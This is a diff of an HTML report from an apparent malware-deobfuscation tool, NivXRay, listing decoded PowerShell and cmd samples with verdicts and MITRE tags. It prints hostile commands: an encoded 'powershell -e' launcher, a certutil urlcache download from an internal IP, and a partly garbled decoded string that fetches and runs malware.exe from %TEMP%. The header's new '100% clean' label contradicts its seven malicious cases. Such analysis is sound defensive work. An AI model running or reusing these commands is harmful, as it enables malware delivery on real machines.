@@ -1,4 +1,4 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8"><title>NivXRay · v1.3.5</title>
+<!DOCTYPE html><html><head><meta charset="UTF-8"><title>NivXRay · v1.3.6</title>
 <style>body{font-family:-apple-system,Segoe UI,sans-serif;background:#0a0e12;color:#e8ecf1;padding:24px;max-width:1400px;margin:0 auto}
 h1{color:#7ee3c9;font-size:22px;border-bottom:2px solid #7ee3c9;padding-bottom:8px}
 .case{background:#12181f;border:1px solid #22303f;border-left:4px solid #6b7280;border-radius:6px;padding:16px;margin:16px 0}
@@ -10,7 +10,7 @@ h1{color:#7ee3c9;font-size:22px;border-bottom:2px solid #7ee3c9;padding-bottom:8
 .chain{background:#7ee3c922;color:#7ee3c9;border:1px solid #7ee3c9}.pp{background:#0d5460;color:#7ee3c9;border:1px solid #7ee3c9;padding:2px 6px;font-size:10px;border-radius:3px;margin-right:4px}
 .section-title{color:#9ca3af;font-size:11px;text-transform:uppercase;letter-spacing:.08em;margin:8px 0 4px}
 pre{background:#0a0e12;border:1px solid #22303f;padding:10px;border-radius:4px;font-size:11px;white-space:pre-wrap;word-break:break-all;font-family:JetBrains Mono,monospace}</style></head><body>
-<h1>NivXRay · Workspace Cases · v1.3.5</h1><p>Sat Jul 18 13:52:42 UTC 2026</p>
+<h1>NivXRay · Workspace Cases · v1.3.6 · 100% clean</h1><p>Sat Jul 18 14:11:22 UTC 2026</p>
 <p style="color:#7ee3c9;font-family:JetBrains Mono">7 Malicious · 6 Suspicious · 2 Corrupted · 2 Undecoded · 17 cases</p>
 <div class="case malicious"><div class="name">#1 · Check the Output_is it a correct or still need further decoding?</div>
 <div><span class="badge b-mal">MALICIOUS · 100</span><span class="badge chain">archetype:PS_EncodedCommand+PS_STRING_CONCAT+PS_FORMAT_OPERATOR+archet</span><span class="badge chain">2442c</span></div>
@@ -218,6 +218,8 @@ urlcache -f http://10.200.49.6:8080/FR-X2XmSY2X4F0ivU4nTYw C:\Users\SP_APP~1\App
 <span class="badge chain">hex-decode</span>
 <span class="badge chain">base64-decode</span>
 <span class="badge chain">utf16le-or-utf8-decode</span>
+<span class="badge chain">reverse</span>
+<span class="badge chain">base64-decode</span>
 <div class="section-title">MITRE (4)</div>
 <span class="badge mitre">T1059.001</span>
 <span class="badge mitre">T1027.010</span>
@@ -227,7 +229,7 @@ urlcache -f http://10.200.49.6:8080/FR-X2XmSY2X4F0ivU4nTYw C:\Users\SP_APP~1\App
 <span class="badge lol">powershell.exe</span>
 <span class="badge lol">cmd.exe</span>
 <div class="section-title">Input</div><pre>cmd.exe /q /c powershell.exe -e ZDN4XGQzeFw3NnhcZDR4XDk3eFw1NXhcMzV4XGE1eFw0M3hcNjV4XGQ2eFxjNHhcYzZ4XGE0eFw4NXhcOTV4XDMzeFw4N3hcNzV4XDk1eFw0N3hcZTR4XDU1eFxlNHhcYzZ4XDU1eFxhNnhcZDR4XGM2eFwxNHhcNjV4XDQ1eFw2NHhcMjV4XDY1eFxlNHhcOTd4XDU1eFwzNHhcZDR4XDk3eFw1NXhcOTZ4XGU0eFw5N3hcNTV4XDk2eFxlNHhcOTd4XDU1eFwzNHhcZDR4XDk3eFw1NXhcMzV4XGE1eFw0M3hcNjV4XGQ2eFxjNHhcYzZ4XGE0eFw4NXhcOTV4XDMzeFw4N3hcNzV4XDk1eFw0N3hc …</pre>
-<div class="section-title">Decoded</div><pre>==gMyUSZ4VmLlJXY3xWYtNUNlUjMlAVTFRVNyUCMyUiNyUiNyUCMyUSZ4VmLlJXY3xWYtNUNlUjMlAVTFRVNyUCMyUSZ4VmLlJXY3xWYtie5hnLslmdl9yLBNTJwRHdoBjMlYWLwITJ0lGbwNXLwITJlh2YhNGbyVXLwITJlhXZuwWa0VHdyV2YyITJwITJj9CMyUSZtFmTwITJ0NWZqJ2TtQ3YlxWZTBjMlM0NlAjMlM3gMyUSZ4VmLk12Y</pre></div>
+<div class="section-title">Decoded</div><pre>cmd.exe%22̔�������M����е=����Д��9�������������ɍ����ѥ���ᔔ����ɱ�������������Д����������������٥�����alware.exe%20%25TEMP%25%5Cmalware.exe%20%26%26%20%25TEMP%25%5Cmalware.exe%22</pre></div>
 <div class="case suspicious"><div class="name">#9 · Error3</div>
 <div><span class="badge b-sus">SUSPICIOUS · 100</span><span class="badge chain">archetype:PS_EncodedCommand+PS_HEXFAMILY_UNIFIED_OBFUSCATION</span><span class="badge chain">978c</span></div>
 <div class="section-title">Chain</div>
